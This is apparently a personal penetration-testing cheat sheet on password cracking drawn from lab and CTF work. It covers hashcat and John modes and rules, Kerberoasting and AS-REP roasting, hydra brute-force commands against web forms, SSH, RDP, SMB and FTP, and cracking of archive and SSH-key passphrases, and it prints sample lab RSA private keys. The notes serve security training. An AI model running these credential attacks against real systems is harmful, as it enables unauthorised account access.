## Hashcat
```
# Search for correct hashcat number
hashcat --example-hashes | grep -B5 {HASH IDENTIFIER}
hashcat -h | grep -i "ntlmv2" 

# Crack Hash
hashcat -m {HASH NUMBER} {HASH} /usr/share/wordlists/rockyou.txt -O --force

Attack Modes
-a 0 # Straight : hash dict
-a 1 # Combination : hash dict dict
-a 3 # Bruteforce : hash mask
-a 6 # Hybrid wordlist + mask : hash dict mask
-a 7 # Hybrid mask + wordlist : hash mask dict

Example Hashes - If you are struggling to match a hash, consult the index and try to visually match it and ctrl+f it.
https://hashcat.net/wiki/doku.php?id=example_hashes  

Rules
/usr/share/hashcat/rules
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule

Fav Rules:
OneRuleToRuleThemAll.rule
OneRuleToRuleThemStill.rule
/usr/share/hashcat/rules/rockyou-30000.rule
/usr/share/hashcat/rules/best64.rule

Generate Word List
Hashcat has a nice rules syntax for generating wordlists. In the help for hashcat it defines the different character sets:
- [ Built-in Charsets ] -

  ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz [a-z]
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]
  d | 0123456789                 [0-9]
  h | 0123456789abcdef           [0-9a-f]
  H | 0123456789ABCDEF           [0-9A-F]
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff

Generate a list using Morris?d?d?d?d?s:
$ /opt/hashcat-6.2.5/hashcat.bin --stdout -a 3 Morris?d?d?d?d?s > mute-passwords

Responder hashes
hashcat -h | grep -i "ntlmv2" 
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol\

Group Policy XML files
Crack XML cpassword string
gpp-decrypt {HASH}


Kerberoast Rubeus Crack:
TGS-REP Hash
PS C:\> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol

13100 is the correct mode to crack TGS-REP hashes.
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

AS-REP-Roast Crack:
PS C:\> .\Rubeus.exe asreproast /nowrap  <-- Using Rubeus to kerberoast locally.
impacket-GetNPUsers -dc-ip 192.168.x.x  -request -outputfile hashes.asreproast corp.com/mute <-- Using GetNPUsers to perform AS-REP roasting remotely.

Check correct mode for an AS-REP hash by grepping for "Kerberos" in hashcat help:
kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol

The correct mode for AS-REP is 18200.
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Hashcat Rules
```
New password policy passwords need 3 numbers, a capital letter and a special character
We can begin to create our rule file. We must include three numbers, at least one capital letter, and at least one special character.

For our first attempt, we'll just use the most common special characters "!", "@", and "#", since they are the first three special characters when typing them from the left side of many keyboard layouts.

Based on the analysis, we'll create our rules. We'll use c for the capitalization of the first letter and $1 $3 $7 for the numerical values. 
To address the special characters, we'll create rules to append the different special characters $!, $@, and $#.

$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

Next, we'll create a wordlist file containing the passwords from note.txt and save the output to ssh.passwords.

kali@kali:~/passwordattacks$ cat ssh.passwords
Window
mute
supermute
megamute
umbrellas

Now we can use Hashcat to perform the cracking by specifying the rules file, the wordlist, and the mode.

kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.5) starting

Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.

Unfortunately, we receive an error indicating that our hash caused a "Token length exception". Several posts suggest that modern private keys and their corresponding passphrases are created with the aes-256-ctr cipher, which Hashcat's mode 22921 does not support.

This reinforces the benefit of using multiple tools since John the Ripper (JtR) can handle this cipher.

john.conf
To be able to use the previously created rules in JtR, we need to add a name for the rules and append them to the /etc/john/john.conf configuration file. For this, we'll name the rule sshRules with a "List.Rules" rule naming syntax. We'll use sudo and sh -c to append the contents of our rule file into /etc/john/john.conf.

kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
 Adding the named rules to the JtR configuration file

Now that we've successfully added our sshRules to the JtR configuration file, we can use john to crack the passphrase in the final step 
We'll define our wordlist with --wordlist=ssh.passwords, select the previously created rule with --rules=sshRules, and provide the hash of the private key as the final argument, ssh.hash.

kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

## Hydra
```
Syntax
hydra [OPTIONS] IP
Useful flags

    -h: see the help menu
    -l <LOGIN>: Pass single username/login
    -L <FILE>: Pass multiple usernames/logins
    -p <LOGIN>: Pass single known password
    -P <FILE>: Pass a password list or wordlist (ex.: rockyou.txt)
    -s <PORT>: Use custom port
    -f: Exit as soon as at least one a login and a password combination is found
    -R: Restore previous session (if crashed/aborted)

Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -m OPT    options specific for a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)
  -V for verbosity

HTTP-Post-Form
Bruteforce web HTTP form
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"

After filling in the placeholders, here’s our command:
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

HTTP-form-post
Putting these pieces together, we can complete the http-form-post syntax as given in Listing 21.
Specifying the http-form-post syntax
http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN"
    
The complete command can now be executed. 
We will supply the admin user name (-l admin) and wordlist (-P), request verbose output with -vV, and use -f to stop the attack when the first successful result is found. 
In addition, we will supply the service module name (http-form-post) and its required arguments ("/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN") 
kali@kali:~$ hydra 10.11.0.x http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f

Hydra Post on a forum
hydra -l mute -P /usr/share/wordlists/rockyou.txt internal.site.tld http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=login:Invalid Username or Password"

Post with Cookies
hydra -l garry -F -P /usr/share/wordlists/rockyou.txt 10.11.x.x -s 8080 http-post-form "/php/index.php:tg=login&referer=index.php&login=login&sAuthType=Ovidentia&nickname=^USER^&password=^PASS^&submit=Login:F=Failed:H=Cookie\: OV3176019645=a4u215fgf3tj8718i0b1rj7ia5"

-F stop after getting login
http-post-form “<url>:<post data>:F=<fail text:H=<header>”
  
HTTP-Post  
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
After filling in the placeholders, here’s our actual command!
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

The HTTP POST body sends two values in the login form to /service/rapture/sesssion — a username and a password, both base64 encoded.  
Check headers filename to see where the http post body is sending the two values

A valid hydra command would look like this:
# -I : ignore any restore files
# -f : stop when a login is found
# -L : username list
# -P : password list
# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values <-- Base64 Encode
# C=/ tells hydra to establish session cookies at this URL
# F=403 tells hydra that HTTP 403 means invalid login

hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
kali@kali:~$ sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

FTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt x.x.x.x ftp
hydra -e nsr -C /usr/share/seclists/Passwords/Default-Credentials 10.11.x.x ftp
hydra -e nsr -L username <IP address> ftp 

The -e switch has three options, n, s, and r:
    n: This option checks for a null password
    s: This option is used for login name as password
    r: This is the reverse of login name as password
    - L: specify a list of usernames
    - P: specify a list of passwords
    -C: Colon separated file for username/password colon-seperated formatted files.
    
For FTP attack use this command
    #hydra -l userlogin -P password-list-adress ftp://----IP--Address -V
    
FTP: 
$ hydra -l admin -C /usr/share/seclists/Passwords/Default-Credentials 192.168.x.x ftp ← Good default cred list. 

SSH:
$ hydra -L users -P pass ssh://192.168.x.x -t 4 -s 43022

SSH
Bruteforce SSH credentials
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh

-f: Exit as soon as at least one a login and a password combination is found
-t: Tasks, run tasks number of connects in parallel per target, default is 16 Tasks. 

For ssh attack:
Hydra -l userlogin -P password-list-adress ssh:// — — IP — Address -V

MySQL:
Bruteforce MySQL credentials
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql

SMB:
Bruteforce SMB credentials
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb

RDP:
hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.x.x

RDP:
Windows RDP
Bruteforce Windows Remote Desktop credentials
hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP

RDP:
Hydra RDP
sudo hydra -f -l nadine -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.x.x -v -t 4
```

## John
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --hashes.txt --show

# About: A tool used to crack passwords, hashes, and zip files 
# --format={HASH}: Specifiy a hash type to crack (see below)
john --format=Raw-MD5 {FILE.txt}

Cracking Modes:
# Dictionnary attack
./john --wordlist=password.lst hashFile

 # Dictionnary attack using default or specific rules
./john --wordlist=password.lst --rules=rulename hashFile
./john --wordlist=password.lst --rules mypasswd

# Incremental mode
./john --incremental hashFile

# Loopback attack (password are taken from the potfile)
./john --loopback hashFile

# Mask bruteforce attack
./john --mask=?1?1?1?1?1?1 --1=[A-Z] hashFile --min-len=8

# Dictionary attack using masks
./john --wordlist=password.lst -mask='?l?l?w?l' hashFile

Misc Tricks.
# Show hidden options
./john --list=hidden-options

# Using session and restoring them
./john hashes --session=name
./john --restore=name
./john --session=allrules --wordlist=all.lst --rules mypasswd &
./john status

# Show the potfile
./john hashes --pot=potFile --show

# Search if a root/uid0 have been cracked
john --show --users=0 mypasswdFile
john --show --users=root mypasswdFile

# List OpenCL devices and get their id
./john --list=opencl-devices

# List format supported by OpenCL
./john --list=formats --format=opencl

# Using multiples GPU
./john hashes --format:openclformat --wordlist:wordlist --rules:rules --dev=0,1 --fork=2

# Using multiple CPU (eg. 4 cores)
./john hashes --wordlist:wordlist --rules:rules --dev=2 --fork=4

Wordlists & Incremental 
# Sort a wordlist for the wordlist mode
tr A-Z a-z < SOURCE | sort -u > TARGET

# Use a potfile to generate a new wordlist
cut -d ':' -f 2 john.pot | sort -u pot.dic

# Generate candidate password for slow hashes
./john --wordlist=password.lst --stdout --rules:Jumbo | ./unique -mem=25 wordlist.uniq

Rules
# Predefined rules
--rules:Single
--rules:Wordlist
--rules:Extra
--rules:Jumbo # All the above
--rules:KoreLogic
--rules:All # All the above

# Create a new rule in John.conf
[List.Rules:Tryout]
l
u
...

| Rule          | Description                                               |
|------------   |-------------------------------------------------------    |
| l             | Convert to lowercase                                      |
| u             | Convert to uppercase                                      |
| c             | Capitalize                                                |
| l r           | Lowercase the word and reverse it                         |
| l Az"2015"    | Lowercase the word and append "2015" at the end           |
| d             | Duplicate                                                 |
| l A0"2015"    | Lowercase the word and append "2015" at the beginning     |
| A0"#"Az"#"    | Add "#" at the beginning and the end of the word          |
| C             |  Lowercase the first char and uppercase the rest          |
| t             | Toggle case of all char                                   |
| TN            | Toggle the case of the char in position N                 |
| r             | Reverse the word                                          |
| f             | Reflect (Fred --> Fredderf)                               |
| {             | Rotate the word left                                      |
| }             | Rotate the word right                                     |
| $x            | Append char X to the word                                 |
| ^x            | Prefix the word with X char                               |
| [             | Remove the first char from the word                       |
| ]             | Remove the last char from the word                        |
| DN            | Delete the char in position N                             |
| xNM           | Extract substring from position N for M char              |
| iNX           | Insert char X in position N and shift the rest right      |
| oNX           | Overstrike char in position N with X                      |
| S             | Shift case                                                |
| V             | Lowercase vowels and uppercase consonants                 |
| R             | Shift each char right on the keyboard                     |
| L             | Shift each char left on the keyboard                      |
| <N            | Reject the word unless it is less than N char long        |
| >N            | Reject the word unless it is greater than N char long     |
| \'N           | Truncate the word at length N                             |
```

## 7z2john
```
$ ls
backup.7z  

Crack Password
I’ll grab a copy and take a look on my local machine. It asks for a password:

root@kali# 7z x backup.7z 
Extracting archive: backup.7z
   Enter password (will not be echoed):

I can crack that password using 7z2john.pl and hashcat:
root@kali# /opt/john/run/7z2john.pl backup.7z > backup.hash

$ hashcat -m 11600 -a 0 -o backup.cracked backup.hash /usr/share/wordlists/rockyou.txt --force
```

## rar2john
```
# Usage - Crack a rar file {FILE.rar} and output hash into text file {FILE.txt} 
sudo rar2john {FILE.rar} > {FILE.txt}

hashcat -h | grep -i "rar" 
  12500 | RAR3-hp                                                    | Archive
  23800 | RAR3-p (Compressed)                                        | Archive
  23700 | RAR3-p (Uncompressed)                                      | Archive
  13000 | RAR5                                                       | Archive

Create Hash
To get this into a format that can be brute forces, I’ll need to run rar2john:

mute@hack$ rar2john keys.rar | tee keys.rar.hash
! file name: rootauthorizedsshkey.pub
keys.rar:$RAR3$*1*723eaa0f90898667*eeb44b5b*384*451*1*a4ef3a3b7fab5f8ea48bd08c77bfaa082d3da7dc432f9805f1683073b9992bdc24893a6f5cee2f9a6339d1b6ab155262e798c3de5f49f2f6abe623026fcf8bae99f67bbf6b5c52b392d049d9edff7122d46514afdf7710164dbef5be373c30e3503e8843a1556e373bdaccbaffc6ccbbb93c318b49585447b0b4f02178b464caddfefc9d545abbbd08943d86edec7d12b1c5d8e1cac47fd6a79fd890ca5e95d37e2d96e319f5543a0e6917939dde9126dbdff0a4e7fd616fdaa3d91a414143535bbd1f4086c35e370ea7ea8a7ab97c71fa43768ec90d165b98906e61de7380510048a1eb7b0deca6a43f819acd3ba9bf56f23f6546ba0d39aa860b8760a0bcdfc73d273cc3996e7675a7ae3cc66d753cf6074127cf9781755d972dba1fc7a640de7218728e8324cbd4f4dc4e7da2e09d38ff256455020523a0481051d732583116a03621f8045b01f1beab2a91845f2e8e052a61635b5d8f05c4cb2b4cf75c586cfcdf8f0e66c3161fd352e52f3f29e2281995356217e93ffeaca388a15829d6*33:1::rootauthorizedsshkey.pub 

tee will save it to a file, and let me look at the output.
```

## ssh2john
```
kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
Enter passphrase for key 'id_rsa':

kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

Determine the correct mode for Hashcat
 hashcat -h | grep -i "ssh" 

  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application Software (EAS)
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)               | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key

The output indicates that "$6$" is mode 22921.

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

## zip2john
```
Cracking a Zip File Password with John The Ripper
To crack a zip file, we first need to extract the password hash then crack it with John the Ripper. 
To extract zip file password hashes, we will use a tool called zip2john. 
Execute the command below to extract the hashes on your zipped file and store them in a file named zip.hashes.

$ zip2john protected.zip > zip.hashes

After successfully extracting the password hash, we will crack it with John the Ripper using a wordlist. Execute the command below:

$ john --wordlist=/usr/share/wordlists/crypton.txt zip.hashes
```

## RsaCtfTool
```
Crack Public Key
RsaCtfTool will try a bunch of different well known cryptography attacks against a public key. I’ll clone it on to my machine, and run it, giving it the public key and --private so that it will show the private key if it cracks it. After a few minutes, it does:

mute@hacks$ /opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private 

[*] Testing key rootauthorizedsshkey.pub.
[*] Performing factordb attack on rootauthorizedsshkey.pub.
[*] Performing fibonacci_gcd attack on rootauthorizedsshkey.pub.
100%| 9999/9999 [00:00<00:00, 157548.15it/s]
[*] Performing system_primes_gcd attack on rootauthorizedsshkey.pub.
100 7007/7007 [00:00<00:00, 1363275.26it/s]
[*] Performing pastctfprimes attack on rootauthorizedsshkey.pub.
100 113/113 [00:00<00:00, 1419030.99it/s]
[*] Performing nonRSA attack on rootauthorizedsshkey.pub.
...[snip]...
[*] Attack success with wiener method !

Results for rootauthorizedsshkey.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
...[snip]...
hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
-----END RSA PRIVATE KEY-----

I’ll save that to a file and chmod it to 600 so SSH will use it.
```

## Base64 Decode
```
The password looks Base64 encoded. So let’s decode in Kali.
echo -n Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 –decode 

# Decode Base64 Encoded Values
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode


This password is secure, it's encoded at least 13 times. 
It’s base64 encoded, so let’s decode it:

root@kali# data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
Charix!2#4%6&8(0

/file/U0VBU09OLTIvMDEuYXZp. That base64 on the end of the path is just the file name:

root@kali# echo U0VBU09OLTIvMDEuYXZp | base64 -d
SEASON-2/01.avi
```

## pdfCrack
```
The .pdf file is password-protected, and although we can use John to crack the file, I like a tool called PDFCrack. 
PDFCrack needs the -f and -w switches for the file and the word-list location.

pdfcrack -f Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
```

## Hexadecimal Decode
```
Decode Hexidecimal Encoded Values
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps

The file is a bunch of hex bytes.

2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d

Grab it, and it decodes to an encrypted RSA cert:

root@kali# wget https://10.10.x.x/dev/hype_key --no-check-certificate
--2018-03-17 15:59:45--  https://10.10.10.79/dev/hype_key
Connecting to 10.10.10.79:443... connected.
WARNING: The certificate of ‘10.10.x.x’ is not trusted.
WARNING: The certificate of ‘10.10.x.x’ hasn't got a known issuer.
The certificate's owner does not match hostname ‘10.10.x.x’
HTTP request sent, awaiting response... 200 OK
Length: 5383 (5.3K)
Saving to: ‘mute_key’

mute_key                                      100%[==============================================================================================>]   5.26K  --.-KB/s    in 0s

2018-03-17 15:59:45 (38.7 MB/s) - ‘mute_key’ saved [5383/5383]

root@kali# cat mute_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
